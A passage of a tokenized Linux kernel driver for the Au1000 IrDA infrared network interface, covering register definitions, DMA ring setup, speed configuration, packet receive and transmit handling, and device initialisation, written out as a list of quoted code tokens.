"/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "netdevice", ".", "h", ">", "#", "include", "<", "linux", "/", "interrupt", ".", "h", ">", "#", "include", "<", "linux", "/", "platform_device", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irmod", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "#", "include", "<", "asm", "/", "mach", "-", "au1x00", "/", "au1000", ".", "h", ">", "/", "*", "registers", "*", "/", "#", "define", "IR_RING_PTR_STATUS", "0x00", "#", "define", "IR_RING_BASE_ADDR_H", "0x04", "#", "define", "IR_RING_BASE_ADDR_L", "0x08", "#", "define", "IR_RING_SIZE", "0x0C", "#", "define", "IR_RING_PROMPT", "0x10", "#", "define", "IR_RING_ADDR_CMPR", "0x14", "#", "define", "IR_INT_CLEAR", "0x18", "#", "define", "IR_CONFIG_1", "0x20", "#", "define", "IR_SIR_FLAGS", "0x24", "#", "define", "IR_STATUS", "0x28", "#", "define", "IR_READ_PHY_CONFIG", "0x2C", "#", "define", "IR_WRITE_PHY_CONFIG", "0x30", "#", "define", "IR_MAX_PKT_LEN", "0x34", "#", "define", "IR_RX_BYTE_CNT", "0x38", "#", "define", "IR_CONFIG_2", "0x3C", "#", "define", "IR_ENABLE", "0x40", "/", "*", "Config1", "*", "/", "#", "define", "IR_RX_INVERT_LED", "(", "1", "<", "<", "0", ")", "#", "define", "IR_TX_INVERT_LED", "(", "1", "<", "<", "1", ")", "#", "define", "IR_ST", "(", "1", "<", "<", "2", ")", "#", "define", "IR_SF", "(", "1", "<", "<", "3", ")", "#", "define", "IR_SIR", "(", "1", "<", "<", "4", ")", "#", "define", "IR_MIR", "(", "1", "<", "<", "5", ")", "#", "define", "IR_FIR", "(", "1", "<", "<", "6", ")", "#", "define", "IR_16CRC", "(", "1", "<", "<", "7", ")", "#", "define", "IR_TD", "(", "1", "<", "<", "8", ")", "#", "define", "IR_RX_ALL", "(", "1", "<", "<", "9", ")", "#", "define", "IR_DMA_ENABLE", "(", "1", "<", "<", "10", ")", "#", "define", "IR_RX_ENABLE", "(", "1", "<", "<", "11", ")", "#", "define", "IR_TX_ENABLE", "(", "1", "<", "<", "12", ")", "#", "define", "IR_LOOPBACK", "(", "1", "<", "<", "14", ")", "#", "define", "IR_SIR_MODE", "(", "IR_SIR", "|", "IR_DMA_ENABLE", "|", "\\", "IR_RX_ALL", "|", "IR_RX_ENABLE", "|", "IR_SF", "|", "\\", "IR_16CRC", ")", "/", "*", "ir_status", "*", "/", "#", "define", "IR_RX_STATUS", "(", "1", "<", "<", "9", ")", "#", "define", "IR_TX_STATUS", "(", "1", "<", "<", "10", ")", "#", "define", "IR_PHYEN", "(", "1", "<", "<", "15", ")", "/", "*", "ir_write_phy_config", "*", "/", "#", "define", "IR_BR", "(", "x", ")", "(", "((", "x", ")", "&", "0x3f", ")", "<", "<", "10", ")", "/", "*", "baud", "rate", "*", "/", "#", "define", "IR_PW", "(", "x", ")", "(", "((", "x", ")", "&", "0x1f", ")", "<", "<", "5", ")", "/", "*", "pulse", "width", "*", "/", "#", "define", "IR_P", "(", "x", ")", "(", "(", "x", ")", "&", "0x1f", ")", "/", "*", "preamble", "bits", "*", "/", "/", "*", "Config2", "*", "/", "#", "define", "IR_MODE_INV", "(", "1", "<", "<", "0", ")", "#", "define", "IR_ONE_PIN", "(", "1", "<", "<", "1", ")", "#", "define", "IR_PHYCLK_40MHZ", "(", "0", "<", "<", "2", ")", "#", "define", "IR_PHYCLK_48MHZ", "(", "1", "<", "<", "2", ")", "#", "define", "IR_PHYCLK_56MHZ", "(", "2", "<", "<", "2", ")", "#", "define", "IR_PHYCLK_64MHZ", "(", "3", "<", "<", "2", ")", "#", "define", "IR_DP", "(", "1", "<", "<", "4", ")", "#", "define", "IR_DA", "(", "1", "<", "<", "5", ")", "#", "define", "IR_FLT_HIGH", "(", "0", "<", "<", "6", ")", "#", "define", "IR_FLT_MEDHI", "(", "1", "<", "<", "6", ")", "#", "define", "IR_FLT_MEDLO", "(", "2", "<", "<", "6", ")", "#", "define", "IR_FLT_LO", "(", "3", "<", "<", "6", ")", "#", "define", "IR_IEN", "(", "1", "<", "<", "8", ")", "/", "*", "ir_enable", "*", "/", "#", "define", "IR_HC", "(", "1", "<", "<", "3", ")", "/", "*", "divide", "SBUS", "clock", "by", "2", "*", "/", "#", "define", "IR_CE", "(", "1", "<", "<", "2", ")", "/", "*", "clock", "enable", "*", "/", "#", "define", "IR_C", "(", "1", "<", "<", "1", ")", "/", "*", "coherency", "bit", "*", "/", "#", "define", "IR_BE", "(", "1", "<", "<", "0", ")", "/", "*", "set", "in", "big", "endian", "mode", "*", "/", "#", "define", "NUM_IR_DESC", "64", "#", "define", "RING_SIZE_4", "0x0", "#", "define", "RING_SIZE_16", "0x3", "#", "define", "RING_SIZE_64", "0xF", "#", "define", "MAX_NUM_IR_DESC", "64", "#", "define", "MAX_BUF_SIZE", "2048", "/", "*", "Ring", "descriptor", "flags", "*", "/", "#", "define", "AU_OWN", "(", "1", "<", "<", "7", ")", "/", "*", "tx", ",", "rx", "*", "/", "#", "define", "IR_DIS_CRC", "(", "1", "<", "<", "6", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_BAD_CRC", "(", "1", "<", "<", "5", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_NEED_PULSE", "(", "1", "<", "<", "4", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_FORCE_UNDER", "(", "1", "<", "<", "3", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_DISABLE_TX", "(", "1", "<", "<", "2", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_HW_UNDER", "(", "1", "<", "<", "0", ")", "/", "*", "tx", "*", "/", "#", "define", "IR_TX_ERROR", "(", "IR_DIS_CRC", "|", "IR_BAD_CRC", "|", "IR_HW_UNDER", ")", "#", "define", "IR_PHY_ERROR", "(", "1", "<", "<", "6", ")", "/", "*", "rx", "*", "/", "#", "define", "IR_CRC_ERROR", "(", "1", "<", "<", "5", ")", "/", "*", "rx", "*", "/", "#", "define", "IR_MAX_LEN", "(", "1", "<", "<", "4", ")", "/", "*", "rx", "*", "/", "#", "define", "IR_FIFO_OVER", "(", "1", "<", "<", "3", ")", "/", "*", "rx", "*", "/", "#", "define", "IR_SIR_ERROR", "(", "1", "<", "<", "2", ")", "/", "*", "rx", "*", "/", "#", "define", "IR_RX_ERROR", "(", "IR_PHY_ERROR", "|", "IR_CRC_ERROR", "|", "\\", "IR_MAX_LEN", "|", "IR_FIFO_OVER", "|", "IR_SIR_ERROR", ")", "struct", "db_dest", "{", "struct", "db_dest", "*", "pnext", ";", "volatile", "u32", "*", "vaddr", ";", "dma_addr_t", "dma_addr", ";", "}", ";", "struct", "ring_dest", "{", "u8", "count_0", ";", "/", "*", "7", ":", "0", "*", "/", "u8", "count_1", ";", "/", "*", "12", ":", "8", "*", "/", "u8", "reserved", ";", "u8", "flags", ";", "u8", "addr_0", ";", "/", "*", "7", ":", "0", "*", "/", "u8", "addr_1", ";", "/", "*", "15", ":", "8", "*", "/", "u8", "addr_2", ";", "/", "*", "23", ":", "16", "*", "/", "u8", "addr_3", ";", "/", "*", "31", ":", "24", "*", "/", "}", ";", "/", "*", "Private", "data", "for", "each", "instance", "*", "/", "struct", "au1k_private", "{", "void", "__iomem", "*", "iobase", ";", "int", "irq_rx", ",", "irq_tx", ";", "struct", "db_dest", "*", "pDBfree", ";", "struct", "db_dest", "db", "[", "2", "*", "NUM_IR_DESC", "]", ";", "volatile", "struct", "ring_dest", "*", "rx_ring", "[", "NUM_IR_DESC", "]", ";", "volatile", "struct", "ring_dest", "*", "tx_ring", "[", "NUM_IR_DESC", "]", ";", "struct", "db_dest", "*", "rx_db_inuse", "[", "NUM_IR_DESC", "]", ";", "struct", "db_dest", "*", "tx_db_inuse", "[", "NUM_IR_DESC", "]", ";", "u32", "rx_head", ";", "u32", "tx_head", ";", "u32", "tx_tail", ";", "u32", "tx_full", ";", "iobuff_t", "rx_buff", ";", "struct", "net_device", "*", "netdev", ";", "struct", "qos_info", "qos", ";", "struct", "irlap_cb", "*", "irlap", ";", "u8", "open", ";", "u32", "speed", ";", "u32", "newspeed", ";", "struct", "resource", "*", "ioarea", ";", "struct", "au1k_irda_platform_data", "*", "platdata", ";", "struct", "clk", "*", "irda_clk", ";", "}", ";", "static", "int", "qos_mtt_bits", "=", "0x07", ";", "/", "*", "1", "ms", "or", "more", "*", "/", "static", "void", "au1k_irda_plat_set_phy_mode", "(", "struct", "au1k_private", "*", "p", ",", "int", "mode", ")", "{", "if", "(", "p", "-", ">", "platdata", "&", "&", "p", "-", ">", "platdata", "-", ">", "set_phy_mode", ")", "p", "-", ">", "platdata", "-", ">", "set_phy_mode", "(", "mode", ")", ";", "}", "static", "inline", "unsigned", "long", "irda_read", "(", "struct", "au1k_private", "*", "p", ",", "unsigned", "long", "ofs", ")", "{", "/", "*", "*", "IrDA", "peripheral", "bug", ".", "You", "have", "to", "read", "the", "register", "*", "twice", "to", "get", "the", "right", "value", ".", "*", "/", "(", "void", ")", "__raw_readl", "(", "p", "-", ">", "iobase", "+", "ofs", ")", ";", "return", "__raw_readl", "(", "p", "-", ">", "iobase", "+", "ofs", ")", ";", "}", "static", "inline", "void", "irda_write", "(", "struct", "au1k_private", "*", "p", ",", "unsigned", "long", "ofs", ",", "unsigned", "long", "val", ")", "{", "__raw_writel", "(", "val", ",", "p", "-", ">", "iobase", "+", "ofs", ")", ";", "wmb", "(", ");", "}", "/", "*", "*", "Buffer", "allocation", "/", "deallocation", "routines", ".", "The", "buffer", "descriptor", "returned", "*", "has", "the", "virtual", "and", "dma", "address", "of", "a", "buffer", "suitable", "for", "*", "both", ",", "receive", "and", "transmit", "operations", ".", "*", "/", "static", "struct", "db_dest", "*", "GetFreeDB", "(", "struct", "au1k_private", "*", "aup", ")", "{", "struct", "db_dest", "*", "db", ";", "db", "=", "aup", "-", ">", "pDBfree", ";", "if", "(", "db", ")", "aup", "-", ">", "pDBfree", "=", "db", "-", ">", "pnext", ";", "return", "db", ";", "}", "/", "*", "DMA", "memory", "allocation", ",", "derived", "from", "pci_alloc_consistent", ".", "However", ",", "the", "Au1000", "data", "cache", "is", "coherent", "(", "when", "programmed", "so", ")", ",", "therefore", "we", "return", "KSEG0", "address", ",", "not", "KSEG1", ".", "*", "/", "static", "void", "*", "dma_alloc", "(", "size_t", "size", ",", "dma_addr_t", "*", "dma_handle", ")", "{", "void", "*", "ret", ";", "int", "gfp", "=", "GFP_ATOMIC", "|", "GFP_DMA", ";", "ret", "=", "(", "void", "*", ")", "__get_free_pages", "(", "gfp", ",", "get_order", "(", "size", ")", ");", "if", "(", "ret", "!", "=", "NULL", ")", "{", "memset", "(", "ret", ",", "0", ",", "size", ")", ";", "*", "dma_handle", "=", "virt_to_bus", "(", "ret", ")", ";", "ret", "=", "(", "void", "*", ")", "KSEG0ADDR", "(", "ret", ")", ";", "}", "return", "ret", ";", "}", "static", "void", "dma_free", "(", "void", "*", "vaddr", ",", "size_t", "size", ")", "{", "vaddr", "=", "(", "void", "*", ")", "KSEG0ADDR", "(", "vaddr", ")", ";", "free_pages", "(", "(", "unsigned", "long", ")", "vaddr", ",", "get_order", "(", "size", ")", ");", "}", "static", "void", "setup_hw_rings", "(", "struct", "au1k_private", "*", "aup", ",", "u32", "rx_base", ",", "u32", "tx_base", ")", "{", "int", "i", ";", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "aup", "-", ">", "rx_ring", "[", "i", "]", "=", "(", "volatile", "struct", "ring_dest", "*", ")", "(", "rx_base", "+", "sizeof", "(", "struct", "ring_dest", ")", "*", "i", ")", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "aup", "-", ">", "tx_ring", "[", "i", "]", "=", "(", "volatile", "struct", "ring_dest", "*", ")", "(", "tx_base", "+", "sizeof", "(", "struct", "ring_dest", ")", "*", "i", ")", ";", "}", "}", "static", "int", "au1k_irda_init_iobuf", "(", "iobuff_t", "*", "io", ",", "int", "size", ")", "{", "io", "-", ">", "head", "=", "kmalloc", "(", "size", ",", "GFP_KERNEL", ")", ";", "if", "(", "io", "-", ">", "head", "!", "=", "NULL", ")", "{", "io", "-", ">", "truesize", "=", "size", ";", "io", "-", ">", "in_frame", "=", "FALSE", ";", "io", "-", ">", "state", "=", "OUTSIDE_FRAME", ";", "io", "-", ">", "data", "=", "io", "-", ">", "head", ";", "}", "return", "io", "-", ">", "head", "?", "0", ":", "-", "ENOMEM", ";", "}", "/", "*", "*", "Set", "the", "IrDA", "communications", "speed", ".", "*", "/", "static", "int", "au1k_irda_set_speed", "(", "struct", "net_device", "*", "dev", ",", "int", "speed", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "volatile", "struct", "ring_dest", "*", "ptxd", ";", "unsigned", "long", "control", ";", "int", "ret", "=", "0", ",", "timeout", "=", "10", ",", "i", ";", "if", "(", "speed", "=", "=", "aup", "-", ">", "speed", ")", "return", "ret", ";", "/", "*", "disable", "PHY", "first", "*", "/", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_OFF", ")", ";", "irda_write", "(", "aup", ",", "IR_STATUS", ",", "irda_read", "(", "aup", ",", "IR_STATUS", ")", "&", "~", "IR_PHYEN", ")", ";", "/", "*", "disable", "RX", "/", "TX", "*", "/", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_1", ")", "&", "~", "(", "IR_RX_ENABLE", "|", "IR_TX_ENABLE", ")", ");", "msleep", "(", "20", ")", ";", "while", "(", "irda_read", "(", "aup", ",", "IR_STATUS", ")", "&", "(", "IR_RX_STATUS", "|", "IR_TX_STATUS", ")", ")", "{", "msleep", "(", "20", ")", ";", "if", "(", "!", "timeout", "-", "-)", "{", "netdev_err", "(", "dev", ",", "\"", "rx", "/", "tx", "disable", "timeout", "\\", "n", "\"", ");", "break", ";", "}", "}", "/", "*", "disable", "DMA", "*", "/", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_1", ")", "&", "~", "IR_DMA_ENABLE", ")", ";", "msleep", "(", "20", ")", ";", "/", "*", "After", "we", "disable", "tx", "/", "rx", ".", "the", "index", "pointers", "go", "back", "to", "zero", ".", "*", "/", "aup", "-", ">", "tx_head", "=", "aup", "-", ">", "tx_tail", "=", "aup", "-", ">", "rx_head", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "ptxd", "=", "aup", "-", ">", "tx_ring", "[", "i", "]", ";", "ptxd", "-", ">", "flags", "=", "0", ";", "ptxd", "-", ">", "count_0", "=", "0", ";", "ptxd", "-", ">", "count_1", "=", "0", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "{", "ptxd", "=", "aup", "-", ">", "rx_ring", "[", "i", "]", ";", "ptxd", "-", ">", "count_0", "=", "0", ";", "ptxd", "-", ">", "count_1", "=", "0", ";", "ptxd", "-", ">", "flags", "=", "AU_OWN", ";", "}", "if", "(", "speed", "=", "=", "4000000", ")", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_FIR", ")", ";", "else", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_SIR", ")", ";", "switch", "(", "speed", ")", "{", "case", "9600", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_BR", "(", "11", ")", "|", "IR_PW", "(", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_SIR_MODE", ")", ";", "break", ";", "case", "19200", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_BR", "(", "5", ")", "|", "IR_PW", "(", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_SIR_MODE", ")", ";", "break", ";", "case", "38400", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_BR", "(", "2", ")", "|", "IR_PW", "(", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_SIR_MODE", ")", ";", "break", ";", "case", "57600", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_BR", "(", "1", ")", "|", "IR_PW", "(", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_SIR_MODE", ")", ";", "break", ";", "case", "115200", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_PW", "(", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_SIR_MODE", ")", ";", "break", ";", "case", "4000000", ":", "irda_write", "(", "aup", ",", "IR_WRITE_PHY_CONFIG", ",", "IR_P", "(", "15", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "IR_FIR", "|", "IR_DMA_ENABLE", "|", "IR_RX_ENABLE", ")", ";", "break", ";", "default", ":", "netdev_err", "(", "dev", ",", "\"", "unsupported", "speed", "%", "x", "\\", "n", "\"", ",", "speed", ")", ";", "ret", "=", "-", "EINVAL", ";", "break", ";", "}", "aup", "-", ">", "speed", "=", "speed", ";", "irda_write", "(", "aup", ",", "IR_STATUS", ",", "irda_read", "(", "aup", ",", "IR_STATUS", ")", "|", "IR_PHYEN", ")", ";", "control", "=", "irda_read", "(", "aup", ",", "IR_STATUS", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_PROMPT", ",", "0", ")", ";", "if", "(", "control", "&", "(", "1", "<", "<", "14", ")", ")", "{", "netdev_err", "(", "dev", ",", "\"", "configuration", "error", "\\", "n", "\"", ");", "}", "else", "{", "if", "(", "control", "&", "(", "1", "<", "<", "11", ")", ")", "netdev_debug", "(", "dev", ",", "\"", "Valid", "SIR", "config", "\\", "n", "\"", ");", "if", "(", "control", "&", "(", "1", "<", "<", "12", ")", ")", "netdev_debug", "(", "dev", ",", "\"", "Valid", "MIR", "config", "\\", "n", "\"", ");", "if", "(", "control", "&", "(", "1", "<", "<", "13", ")", ")", "netdev_debug", "(", "dev", ",", "\"", "Valid", "FIR", "config", "\\", "n", "\"", ");", "if", "(", "control", "&", "(", "1", "<", "<", "10", ")", ")", "netdev_debug", "(", "dev", ",", "\"", "TX", "enabled", "\\", "n", "\"", ");", "if", "(", "control", "&", "(", "1", "<", "<", "9", ")", ")", "netdev_debug", "(", "dev", ",", "\"", "RX", "enabled", "\\", "n", "\"", ");", "}", "return", "ret", ";", "}", "static", "void", "update_rx_stats", "(", "struct", "net_device", "*", "dev", ",", "u32", "status", ",", "u32", "count", ")", "{", "struct", "net_device_stats", "*", "ps", "=", "&", "dev", "-", ">", "stats", ";", "ps", "-", ">", "rx_packets", "+", "+;", "if", "(", "status", "&", "IR_RX_ERROR", ")", "{", "ps", "-", ">", "rx_errors", "+", "+;", "if", "(", "status", "&", "(", "IR_PHY_ERROR", "|", "IR_FIFO_OVER", ")", ")", "ps", "-", ">", "rx_missed_errors", "+", "+;", "if", "(", "status", "&", "IR_MAX_LEN", ")", "ps", "-", ">", "rx_length_errors", "+", "+;", "if", "(", "status", "&", "IR_CRC_ERROR", ")", "ps", "-", ">", "rx_crc_errors", "+", "+;", "}", "else", "ps", "-", ">", "rx_bytes", "+", "=", "count", ";", "}", "static", "void", "update_tx_stats", "(", "struct", "net_device", "*", "dev", ",", "u32", "status", ",", "u32", "pkt_len", ")", "{", "struct", "net_device_stats", "*", "ps", "=", "&", "dev", "-", ">", "stats", ";", "ps", "-", ">", "tx_packets", "+", "+;", "ps", "-", ">", "tx_bytes", "+", "=", "pkt_len", ";", "if", "(", "status", "&", "IR_TX_ERROR", ")", "{", "ps", "-", ">", "tx_errors", "+", "+;", "ps", "-", ">", "tx_aborted_errors", "+", "+;", "}", "}", "static", "void", "au1k_tx_ack", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "volatile", "struct", "ring_dest", "*", "ptxd", ";", "ptxd", "=", "aup", "-", ">", "tx_ring", "[", "aup", "-", ">", "tx_tail", "]", ";", "while", "(", "!(", "ptxd", "-", ">", "flags", "&", "AU_OWN", ")", "&", "&", "(", "aup", "-", ">", "tx_tail", "!", "=", "aup", "-", ">", "tx_head", ")", ")", "{", "update_tx_stats", "(", "dev", ",", "ptxd", "-", ">", "flags", ",", "(", "ptxd", "-", ">", "count_1", "<", "<", "8", ")", "|", "ptxd", "-", ">", "count_0", ")", ";", "ptxd", "-", ">", "count_0", "=", "0", ";", "ptxd", "-", ">", "count_1", "=", "0", ";", "wmb", "(", ");", "aup", "-", ">", "tx_tail", "=", "(", "aup", "-", ">", "tx_tail", "+", "1", ")", "&", "(", "NUM_IR_DESC", "-", "1", ")", ";", "ptxd", "=", "aup", "-", ">", "tx_ring", "[", "aup", "-", ">", "tx_tail", "]", ";", "if", "(", "aup", "-", ">", "tx_full", ")", "{", "aup", "-", ">", "tx_full", "=", "0", ";", "netif_wake_queue", "(", "dev", ")", ";", "}", "}", "if", "(", "aup", "-", ">", "tx_tail", "=", "=", "aup", "-", ">", "tx_head", ")", "{", "if", "(", "aup", "-", ">", "newspeed", ")", "{", "au1k_irda_set_speed", "(", "dev", ",", "aup", "-", ">", "newspeed", ")", ";", "aup", "-", ">", "newspeed", "=", "0", ";", "}", "else", "{", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_1", ")", "&", "~", "IR_TX_ENABLE", ")", ";", "irda_write", "(", "aup", ",", "IR_CONFIG_1", ",", "irda_read", "(", "aup", ",", "IR_CONFIG_1", ")", "|", "IR_RX_ENABLE", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_PROMPT", ",", "0", ")", ";", "}", "}", "}", "static", "int", "au1k_irda_rx", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "volatile", "struct", "ring_dest", "*", "prxd", ";", "struct", "sk_buff", "*", "skb", ";", "struct", "db_dest", "*", "pDB", ";", "u32", "flags", ",", "count", ";", "prxd", "=", "aup", "-", ">", "rx_ring", "[", "aup", "-", ">", "rx_head", "]", ";", "flags", "=", "prxd", "-", ">", "flags", ";", "while", "(", "!(", "flags", "&", "AU_OWN", ")", ")", "{", "pDB", "=", "aup", "-", ">", "rx_db_inuse", "[", "aup", "-", ">", "rx_head", "]", ";", "count", "=", "(", "prxd", "-", ">", "count_1", "<", "<", "8", ")", "|", "prxd", "-", ">", "count_0", ";", "if", "(", "!(", "flags", "&", "IR_RX_ERROR", ")", ")", "{", "/", "*", "good", "frame", "*", "/", "update_rx_stats", "(", "dev", ",", "flags", ",", "count", ")", ";", "skb", "=", "alloc_skb", "(", "count", "+", "1", ",", "GFP_ATOMIC", ")", ";", "if", "(", "skb", "=", "=", "NULL", ")", "{", "dev", "-", ">", "stats", ".", "rx_dropped", "+", "+;", "continue", ";", "}", "skb_reserve", "(", "skb", ",", "1", ")", ";", "if", "(", "aup", "-", ">", "speed", "=", "=", "4000000", ")", "skb_put", "(", "skb", ",", "count", ")", ";", "else", "skb_put", "(", "skb", ",", "count", "-", "2", ")", ";", "skb_copy_to_linear_data", "(", "skb", ",", "(", "void", "*", ")", "pDB", "-", ">", "vaddr", ",", "count", "-", "2", ")", ";", "skb", "-", ">", "dev", "=", "dev", ";", "skb_reset_mac_header", "(", "skb", ")", ";", "skb", "-", ">", "protocol", "=", "htons", "(", "ETH_P_IRDA", ")", ";", "netif_rx", "(", "skb", ")", ";", "prxd", "-", ">", "count_0", "=", "0", ";", "prxd", "-", ">", "count_1", "=", "0", ";", "}", "prxd", "-", ">", "flags", "|", "=", "AU_OWN", ";", "aup", "-", ">", "rx_head", "=", "(", "aup", "-", ">", "rx_head", "+", "1", ")", "&", "(", "NUM_IR_DESC", "-", "1", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_PROMPT", ",", "0", ")", ";", "/", "*", "next", "descriptor", "*", "/", "prxd", "=", "aup", "-", ">", "rx_ring", "[", "aup", "-", ">", "rx_head", "]", ";", "flags", "=", "prxd", "-", ">", "flags", ";", "}", "return", "0", ";", "}", "static", "irqreturn_t", "au1k_irda_interrupt", "(", "int", "dummy", ",", "void", "*", "dev_id", ")", "{", "struct", "net_device", "*", "dev", "=", "dev_id", ";", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "irda_write", "(", "aup", ",", "IR_INT_CLEAR", ",", "0", ")", ";", "/", "*", "ack", "irda", "interrupts", "*", "/", "au1k_irda_rx", "(", "dev", ")", ";", "au1k_tx_ack", "(", "dev", ")", ";", "return", "IRQ_HANDLED", ";", "}", "static", "int", "au1k_init", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "u32", "enable", ",", "ring_address", ",", "phyck", ";", "struct", "clk", "*", "c", ";", "int", "i", ";", "c", "=", "clk_get", "(", "NULL", ",", "\"", "irda_clk", "\"", ");", "if", "(", "IS_ERR", "(", "c", ")", ")", "return", "PTR_ERR", "(", "c", ")", ";", "i", "=", "clk_prepare_enable", "(", "c", ")", ";", "if", "(", "i", ")", "{", "clk_put", "(", "c", ")", ";", "return", "i", ";", "}", "switch", "(", "clk_get_rate", "(", "c", ")", ")", "{", "case", "40000000", ":", "phyck", "=", "IR_PHYCLK_40MHZ", ";", "break", ";", "case", "48000000", ":", "phyck", "=", "IR_PHYCLK_48MHZ", ";", "break", ";", "case", "56000000", ":", "phyck", "=", "IR_PHYCLK_56MHZ", ";", "break", ";", "case", "64000000", ":", "phyck", "=", "IR_PHYCLK_64MHZ", ";", "break", ";", "default", ":", "clk_disable_unprepare", "(", "c", ")", ";", "clk_put", "(", "c", ")", ";", "return", "-", "EINVAL", ";", "}", "aup", "-", ">", "irda_clk", "=", "c", ";", "enable", "=", "IR_HC", "|", "IR_CE", "|", "IR_C", ";", "#", "ifndef", "CONFIG_CPU_LITTLE_ENDIAN", "enable", "|", "=", "IR_BE", ";", "#", "endif", "aup", "-", ">", "tx_head", "=", "0", ";", "aup", "-", ">", "tx_tail", "=", "0", ";", "aup", "-", ">", "rx_head", "=", "0", ";", "for", "(", "i", "=", "0", ";", "i", "<", "NUM_IR_DESC", ";", "i", "+", "+)", "aup", "-", ">", "rx_ring", "[", "i", "]", "->", "flags", "=", "AU_OWN", ";", "irda_write", "(", "aup", ",", "IR_ENABLE", ",", "enable", ")", ";", "msleep", "(", "20", ")", ";", "/", "*", "disable", "PHY", "*", "/", "au1k_irda_plat_set_phy_mode", "(", "aup", ",", "AU1000_IRDA_PHY_MODE_OFF", ")", ";", "irda_write", "(", "aup", ",", "IR_STATUS", ",", "irda_read", "(", "aup", ",", "IR_STATUS", ")", "&", "~", "IR_PHYEN", ")", ";", "msleep", "(", "20", ")", ";", "irda_write", "(", "aup", ",", "IR_MAX_PKT_LEN", ",", "MAX_BUF_SIZE", ")", ";", "ring_address", "=", "(", "u32", ")", "virt_to_phys", "(", "(", "void", "*", ")", "aup", "-", ">", "rx_ring", "[", "0", "]", ");", "irda_write", "(", "aup", ",", "IR_RING_BASE_ADDR_H", ",", "ring_address", ">", ">", "26", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_BASE_ADDR_L", ",", "(", "ring_address", ">", ">", "10", ")", "&", "0xffff", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_SIZE", ",", "(", "RING_SIZE_64", "<", "<", "8", ")", "|", "(", "RING_SIZE_64", "<", "<", "12", ")", ");", "irda_write", "(", "aup", ",", "IR_CONFIG_2", ",", "phyck", "|", "IR_ONE_PIN", ")", ";", "irda_write", "(", "aup", ",", "IR_RING_ADDR_CMPR", ",", "0", ")", ";", "au1k_irda_set_speed", "(", "dev", ",", "9600", ")", ";", "return", "0", ";", "}", "static", "int", "au1k_irda_start", "(", "struct", "net_device", "*", "dev", ")", "{", "struct", "au1k_private", "*", "aup", "=", "netdev_priv", "(", "dev", ")", ";", "char", "hwname", "[", "32", "]", ";", "int", "retval", ";", "retval", "=", "au1k_init", "(", "dev", ")", ";", "if", "(", "retval", ")", "{", "netdev_err", "(", "dev", ",", "\"", "error", "in", "au1k_init", "\\", "n", "\"", ");", "return", "retval", ";", "}", "retval", "=", "request_irq", "(", "aup", "-", ">", "irq_tx", ",", "&", "au1k_irda_interrupt", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ";", "if", "(", "retval", ")", "{", "netdev_err", "(", "dev", ",", "\"", "unable", "to", "get", "IRQ", "%", "d", "\\", "n", "\"", ",", "dev", "-", ">", "irq", ")", ";", "return", "retval", ";", "}", "retval", "=", "request_irq", "(", "aup", "-", ">", "irq_rx", ",", "&", "au1k_irda_interrupt", ",", "0", ",", "dev", "-", ">", "name", ",", "dev", ")", ";", "if", "(", "retval", ")", "{", "free_irq", "(", "aup", "-", ">", "irq_tx", ",", "dev", ")", ";", "netdev_err", "(", "dev", ",", "\"", "unable", "to", "get", "IRQ", "%", "d", "\\", "n", "\"", ",", "dev", 